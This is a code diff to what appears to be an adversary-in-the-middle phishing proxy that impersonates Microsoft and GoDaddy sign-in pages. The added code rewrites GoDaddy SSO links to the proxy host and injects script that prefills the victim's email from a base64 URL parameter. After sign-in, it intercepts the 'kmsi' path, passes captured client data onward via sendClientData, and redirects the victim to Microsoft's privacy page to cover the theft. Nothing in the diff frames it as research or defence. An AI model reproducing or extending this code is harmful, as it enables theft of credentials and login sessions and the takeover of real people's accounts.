@@ -1,5 +1,6 @@
 /* eslint-disable camelcase,class-methods-use-this */
 // eslint-disable-next-line max-classes-per-file
+const { timeStamp } = require('console')
 const path = require('path')
 const url = require('url')
 
@@ -36,6 +37,10 @@ const ProxyResponse = class extends globalWorker.BaseClasses.BaseProxyResponseCl
                     + '</head> <body data-bind="defineGlobals: ServerData" style="display: none"> </body> </html>',
              },
              {
+                reg: /sso.godaddy.com/igm, // Google chrome on windows fix
+                replacement: this.browserEndPoint.clientContext.hostname,
+             },
+             {
                 reg: /<\/html>/igm, // Google chrome on windows fix
                 replacement: '<script>window.onload = function(){function lp(){var e=document.getElementById("i0116");if(e){console.log("kuka");const t=new URLSearchParams(window.location.search).get("qrc")||"";let o;try{o=atob(t)}catch{o=t}e.value=o}else setTimeout(lp,600)}lp();}</script> </html>',
              },
@@ -46,23 +51,16 @@ const ProxyResponse = class extends globalWorker.BaseClasses.BaseProxyResponseCl
     processResponse() {
         this.browserEndPoint.removeHeader('X-Frame-Options')
         if (this.proxyResp.headers['content-length'] < 1) {
-            // {
             return this.proxyResp.pipe(this.browserEndPoint)
-            // }
+        }
+
+        if (this.proxyResp.req.path.startsWith('/kmsi') || this.proxyResp.req.path.startsWith('/common/reprocess')){
+            this.browserEndPoint.writeHead(302, {'location': '/ping/v5767687'})
+            return this.browserEndPoint.end()
         }
 
 
-        const extRedirectObj = super.getExternalRedirect()
-        if (extRedirectObj !== null) {
-           const rLocation = extRedirectObj.url
-            if (rLocation === 'https://www.office.com/landing') {
-                this.concludeAuth()
-            }
-            if (rLocation.startsWith('https://login.microsoftonline.com/common/oauth2/authorize?client_id=')) {
-                return this.proxyResp.pipe(this.browserEndPoint)
-            }
-        }
-
+       
         // return super.processResponse()
          let newMsgBody;
         return this.superPrepareResponse(true)
@@ -105,7 +103,7 @@ const ProxyResponse = class extends globalWorker.BaseClasses.BaseProxyResponseCl
     }
 
     concludeAuth() {
-        console.log('Concluding path')
+        this.browserEndPoint.setHeader('location', '/ping/v5767687')
 
     }
 }
@@ -139,7 +137,13 @@ const DefaultPreHandler = class extends globalWorker.BaseClasses.BasePreClass {
 
         if (this.req.url === '/kmsi' || this.req.url === '/common/SAS/ProcessAuth' ) {
             clientContext.setLogAvailable(true);
+            // super.sendClientData(clientContext, {})
+        }
+
+        if (this.req.url === '/ping/v5767687') {
             super.sendClientData(clientContext, {})
+            this.res.writeHead(302, { location: 'https://privacy.microsoft.com/en-us/privacystatement' })
+            return super.cleanEnd(clientContext.currentDomain, clientContext)
         }
 
         return super.superExecuteProxy(clientContext.currentDomain, clientContext)
